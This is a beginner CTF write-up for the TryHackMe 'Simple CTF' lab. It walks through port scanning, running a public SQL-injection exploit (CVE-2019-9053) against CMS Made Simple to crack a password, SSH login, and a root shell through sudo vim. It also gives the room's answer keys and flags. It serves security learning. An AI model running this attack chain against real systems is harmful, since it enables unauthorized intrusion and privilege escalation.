### **Try Hack Me: Simple CTF (Writeup)**

> <u>Description</u>
> Level: Beginner
> Duration: 60 mins
> Machine IP: 10.10.237.205

Deploy the machine and attempt the question!

------

##### 1. Information Gathering

Use nmap to perform port scanning to find out what port is opening and what service is running.

```markdown
$ nmap 10.10.237.205

Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 13:56 +07
Nmap scan report for 10.10.237.205
Host is up (0.21s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

> <u>Answer Keys</u>
>
> 1. How many services are running under port 1000?: **2** services (21, 80)
> 2. What is running on the higher port?: **ssh** (port 2222)

Then perform scanning each port to take a deep look.

- *port 2222 (ssh)*

```markdown
$ sudo nmap -sV -sT -A  10.10.237.205 -p 2222
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 13:56 +07
Nmap scan report for 10.10.237.205
Host is up (0.24s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   255.23 ms 10.8.0.1
2   255.32 ms 10.10.237.205

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.22 seconds
```

- *port 80 (http)*

```markdown
$ sudo nmap -sV -sT -A  10.10.237.205 -p 80
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 13:57 +07
Nmap scan report for 10.10.237.205
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Infomir MAG-250 set-top box (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   207.66 ms 10.8.0.1
2   207.84 ms 10.10.237.205

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.27 seconds
```

- *port 21 (ftp)*

```markdown
$ sudo nmap -sV -sT -A  10.10.237.205 -p 21
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 13:57 +07
Nmap scan report for 10.10.237.205
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.100.173
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Unix

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   207.87 ms 10.8.0.1
2   207.97 ms 10.10.237.205

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.02 seconds
```

I logged in to ftp as anonymous user and I found that there's nothing interesting here, so I moved on to other port.

Since port 80 (http) is open, so I took a look to webpage. I found there was an *Apache default page* when access http://10.10.237.205

![image-20200826143155941](C:\Users\chananya.c\Documents\writeup\tryhackme-simplectf.assets\image-20200826143155941.png)

And then I used dirb for scanning web path directory to find what path will be discover.

```markdown
$ dirb http://10.10.237.205

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Aug 26 14:00:21 2020
URL_BASE: http://10.10.237.205/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.237.205/ ----
+ http://10.10.237.205/index.html (CODE:200|SIZE:11321)                                                                  
+ http://10.10.237.205/robots.txt (CODE:200|SIZE:929)                                                                   
+ http://10.10.237.205/server-status (CODE:403|SIZE:301)                                                               
==> DIRECTORY: http://10.10.237.205/simple/
```

I took a look of each path closely, since /index.html is apache page, so I moved on to /robots.txt by curling webpage

- */robots.txt*

```markdown
$ curl -i -k http://10.10.237.205/robots.txt
HTTP/1.1 200 OK
Date: Wed, 26 Aug 2020 07:07:14 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Sat, 17 Aug 2019 16:15:27 GMT
ETag: "3a1-590526a3cb146"
Accept-Ranges: bytes
Content-Length: 929
Vary: Accept-Encoding
Content-Type: text/plain

#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```

Hmm, I tried access /openemr-5_0_1_3 and found that the webpage returned 'Not Found'.

- */server-status*

```php+HTML
$ curl -i -k http://10.10.237.205/server-status
HTTP/1.1 403 Forbidden
Date: Wed, 26 Aug 2020 07:43:06 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 301
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /server-status
on this server.<br />
</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.237.205 Port 80</address>
</body></html>
```

Forbidden... Fine.

- */simple*

```php+HTML
$ curl -i -k http://10.10.237.205/simple
HTTP/1.1 301 Moved Permanently
Date: Wed, 26 Aug 2020 07:44:44 GMT
Server: Apache/2.4.18 (Ubuntu)
Location: http://10.10.237.205/simple/
Content-Length: 315
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://10.10.237.205/simple/">here</a>.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.237.205 Port 80</address>
</body></html>
```

![image-20200826144557932](C:\Users\chananya.c\Documents\writeup\tryhackme-simplectf.assets\image-20200826144557932.png)

I found that /simple path landed the CMS webpage.



------

##### 2. Preparing to exploit

Since I found that the webpage use **CMS Made Simple (version 2.2.8)**, so I started to search what CVE can exploit this web application

```shell
$ searchsploit CMS 2.2.8
-------------------------------------------------------------------------------- --------------------------------------
 Exploit Title								        |  Path
-------------------------------------------------------------------------------- --------------------------------------
Bolt CMS < 3.6.2 - Cross-Site Scripting						| php/webapps/46014.txt
CMS Made Simple < 2.2.10 - SQL Injection				        | php/webapps/46635.py
Concrete CMS < 5.5.21 - Multiple Vulnerabilities			        | php/webapps/37225.pl
Concrete5 CMS < 5.4.2.1 - Multiple Vulnerabilities		                | php/webapps/17925.txt
Concrete5 CMS < 8.3.0 - Username / Comments Enumeration			        | php/webapps/44194.py
DeDeCMS < 5.7-sp1 - Remote File Inclusion					| php/webapps/37423.txt
Kirby CMS < 2.5.7 - Cross-Site Scripting					| php/webapps/43140.txt
Monstra CMS < 3.0.4 - Cross-Site Scripting (1)				        | php/webapps/44855.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (2)				        | php/webapps/44646.txt
Mura CMS < 6.2 - Server-Side Request Forgery / XML External Entity Injection	| cfm/webapps/43045.txt
Redaxo CMS Mediapool Addon < 5.5.1 - Arbitrary File Upload                      | php/webapps/44891.txt
zKup CMS 2.0 < 2.3 - Arbitrary File Upload	                                | php/webapps/5220.php
zKup CMS 2.0 < 2.3 - Remote Add Admin				                | php/webapps/5219.php
-------------------------------------------------------------------------------- --------------------------------------
Shellcodes: No Results
```

The table showed results that the CMS Made Simple 2.2.8 is vulnerable to **SQL Injection** !!!
I did a quick search about CMS Made Simple CVE and then found the result in Exploit DB.

![image-20200826150154009](C:\Users\chananya.c\Documents\writeup\tryhackme-simplectf.assets\image-20200826150154009.png)

> <u>Answer Keys</u>
>
> 3. What's the CVE you're using against the application?: **CVE-2019-9053**
> 4. To what kind of vulnerability is the application vulnerable?: **SQLi**

Then I downloaded the exploit code.

```shell
$ wget https://www.exploit-db.com/raw/46635
```



------

##### 3. Time to attack!!!

Before exploiting, take a look to the code to find how to use the exploit command. If already, then attack!!!

```bash
$ python 46635.py -u http://10.10.237.205/simple --crack -w /usr/share/wordlists/rockyou.txt
```

Wait for a moment... Then CLICK!

```markdown
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

> <u>Answer Keys</u>
>
> 5. What's the password?: **secret**
> 6. Where can you login with the details obtained?: **SSH**

Since I obtained the username and password, and port 2222 was opened. I logged in to target's machine via ssh by using these credential.

```bash
$ ssh mitch@10.10.237.205 -p 2222
```

![image-20200826153251765](C:\Users\chananya.c\Documents\writeup\tryhackme-simplectf.assets\image-20200826153251765.png)

Time to explore the machine!!!

```bash
$ ls -la
total 36
drwxr-x--- 3 mitch mitch 4096 aug 19  2019 .
drwxr-xr-x 4 root  root  4096 aug 17  2019 ..
-rw------- 1 mitch mitch  178 aug 17  2019 .bash_history
-rw-r--r-- 1 mitch mitch  220 sep  1  2015 .bash_logout
-rw-r--r-- 1 mitch mitch 3771 sep  1  2015 .bashrc
drwx------ 2 mitch mitch 4096 aug 19  2019 .cache
-rw-r--r-- 1 mitch mitch  655 mai 16  2017 .profile
-rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt
-rw------- 1 mitch mitch  515 aug 17  2019 .viminfo
```

The file *user.txt* seems interesting.

```bash
$ cat user.txt

G00d j0b, keep up!
```

Check if there are another user in the home directory.

```bash
$ cd /home
$ pwd
/home
$ ls -la
total 16
drwxr-xr-x  4 root    root    4096 aug 17  2019 .
drwxr-xr-x 23 root    root    4096 aug 19  2019 ..
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
```

I think that I don't have anything to do with user sunbath, so I backed to user mitch to do more exploring.

> <u>Answer Keys</u>
>
> 7. What's the user flag?: **G00d j0b, keep up!**
> 8. Is there any other user in the home directory? What's its name?: **sunbath**



------

##### 4. Privilege Escalation

I took some to get more information about the machine to find the way to break into root, this is what I found.

```bash
$ uname -a
Linux Machine 4.15.0-58-generic #64~16.04.1-Ubuntu SMP Wed Aug 7 14:09:34 UTC 2019 i686 i686 i686 GNU/Linux
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

So I used vim to escalate myself into root. (Oh god, that's the nightmare...)
P.S. Don't forget to type /bin/bash to get into full shell.

```bash
$ /bin/bash
mitch@Machine$ sudo vim shell.txt
```

```vim
:!/bin/bash
~
~
```

Then press enter.
BAAAMMMMM!!!!!!! Got the root!!!

```markdown
root@Machine:~# whoami
root
root@Machine:~# id
uid=0(root) gid=0(root) groups=0(root)
```

It's time to find the root flag!

```
root@Machine:~# cd /root
root@Machine:/root# ls -la
total 28
drwx------  4 root root 4096 aug 17  2019 .
drwxr-xr-x 23 root root 4096 aug 19  2019 ..
-rw-r--r--  1 root root 3106 oct 22  2015 .bashrc
drwx------  2 root root 4096 aug 17  2019 .cache
drwxr-xr-x  2 root root 4096 aug 17  2019 .nano
-rw-r--r--  1 root root  148 aug 17  2015 .profile
-rw-r--r--  1 root root   24 aug 17  2019 root.txt
root@Machine:/root# cat root.txt
W3ll d0n3. You made it!
```

Hooray!!! Root flag found!!!

> <u>Answer Keys</u>
>
> 9. What can you leverage to spawn a privileged shell?: **vim**
> 10. What's the root flag?: **W3ll d0n3. You made it!**

